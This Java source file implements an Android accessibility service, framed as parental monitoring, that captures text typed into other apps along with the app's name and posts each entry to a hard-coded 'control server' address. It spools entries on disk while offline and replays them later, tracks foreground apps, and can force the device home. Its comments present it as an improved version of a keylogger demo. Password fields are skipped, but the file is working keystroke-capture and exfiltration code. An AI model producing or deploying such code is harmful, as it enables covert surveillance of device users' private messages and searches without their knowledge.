package com.example.setup;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.List;

/**
 * Background text capture + app-window tracking.
 *
 * Compared with the Dliv3 Android-KeyLogger-Demo this is deliberately safer and
 * more useful:
 *  - password fields are never reported (event.isPassword() + source node flag)
 *  - each event carries the package AND app label, so the parent knows where
 *    the text was typed (the demo only sent a bare "[PackageName]...")
 *  - trailing debounce instead of dropping keystrokes (the demo logged every
 *    change; our v1.2 throttled and could lose the final query)
 *  - offline spool: events typed while the panel is unreachable are queued on
 *    disk and replayed in order on the next successful connection
 *  - consecutive duplicates (focus + text-change for the same value) suppressed
 */
public class SafetyService extends AccessibilityService {

    private static final String CONTROL_SERVER_URL =
            "http://192.168.1.42:8080/kid-alert";
    private static final long DEBOUNCE_MS = 350;
    private static final int SPOOL_ITEMS = 200;
    private static final long SPOOL_BYTES = 48 * 1024;
    private static final int FLUSH_PER_ROUND = 25;

    private Handler ui;
    private Runnable pendingSender;
    private String pendingText;
    private String pendingPkg;
    private String pendingApp;
    private String lastKey;
    private int seq = 0;
    private EventSpool spool;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || ui == null) return;

        int type = event.getEventType();
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence p = event.getPackageName();
            if (p != null) {
                UsageTracker.onWindow(p.toString());
                UsageTracker.tick();
            }
            // new screen -> the same text is no longer a duplicate
            lastKey = null;
            return;
        }
        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && type != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return;
        }

        CharSequence pkgName = event.getPackageName();
        String pkg = pkgName == null ? null : pkgName.toString();
        if (pkg != null && pkg.equals(getPackageName())) return; // never log ourselves

        boolean password = event.isPassword();
        if (!password) {
            try {
                AccessibilityNodeInfo src = event.getSource();
                if (src != null) password = src.isPassword();
            } catch (Exception ignored) {
                // some IME nodes throw when read outside the event window
            }
        }

        String text = TypingPayload.normalize(event.getText());
        if (!TypingPayload.shouldSend(text, pkg, password, lastKey)) return;

        pendingText = text;
        pendingPkg = pkg;
        pendingApp = AlertCenter.label(this, pkg);

        // Debounce: wait for the typing pause, then send the final value.
        ui.removeCallbacks(pendingSender);
        ui.postDelayed(pendingSender, DEBOUNCE_MS);
    }

    @Override
    public void onInterrupt() {
        // Accessibility service interrupted - nothing to do.
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 50;
        setServiceInfo(info);

        // App-limit enforcement: "send them home" via accessibility global
        // action — no extra permission, works even when a game is open.
        UsageTracker.sendHome = () -> {
            try {
                performGlobalAction(GLOBAL_ACTION_HOME);
            } catch (Exception ignored) {}
        };

        ui = new Handler(Looper.getMainLooper());
        pendingSender = this::sendPending;
        spool = new EventSpool(new File(getFilesDir(), "typing-spool.log"),
                SPOOL_ITEMS, SPOOL_BYTES);

        // Replay anything captured while the panel was unreachable.
        Thread t = new Thread(this::flushSpool, "typing-spool-flush");
        t.setDaemon(true);
        t.start();
    }

    private void sendPending() {
        String text = pendingText;
        String pkg = pendingPkg;
        String app = pendingApp;
        pendingText = null;
        if (text == null) return;

        lastKey = TypingPayload.key(pkg, text);
        final String line = payload(text, pkg, app, ++seq, System.currentTimeMillis());

        Thread t = new Thread(() -> {
            if (deliver(line)) flushSpool();
            else spool.add(line);
        }, "typing-send");
        t.setDaemon(true);
        t.start();
    }

    /** Replay queued events oldest-first; stop and keep the rest on failure. */
    private void flushSpool() {
        List<String> queued = spool.drain();
        if (queued.isEmpty()) return;
        int i = 0;
        for (; i < queued.size() && i < FLUSH_PER_ROUND; i++) {
            if (!deliver(queued.get(i))) break;
        }
        for (; i < queued.size(); i++) spool.add(queued.get(i));
    }

    private static String payload(String text, String pkg, String app, int sequence, long time) {
        StringBuilder sb = new StringBuilder();
        sb.append("query=").append(encode(text));
        if (pkg != null) sb.append("&pkg=").append(encode(pkg));
        if (app != null) sb.append("&app=").append(encode(app));
        sb.append("&seq=").append(sequence);
        sb.append("&time=").append(time);
        return sb.toString();
    }

    private static String encode(String s) {
        try {
            return URLEncoder.encode(s, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }

    /** One POST; true only on a 2xx so the spool knows whether to keep it. */
    private static boolean deliver(String body) {
        HttpURLConnection conn = null;
        try {
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            String ip = KeepAliveService.localIp();
            String url = CONTROL_SERVER_URL + (ip != null ? "?ip=" + encode(ip) : "");
            conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            conn.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded; charset=UTF-8");
            conn.setRequestProperty("Accept", "application/json");

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.write(bytes);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    code >= 400 ? conn.getErrorStream() : conn.getInputStream(),
                    StandardCharsets.UTF_8));
            while (reader.readLine() != null) { /* drain */ }
            reader.close();
            return code >= 200 && code < 300;
        } catch (Exception ignored) {
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}
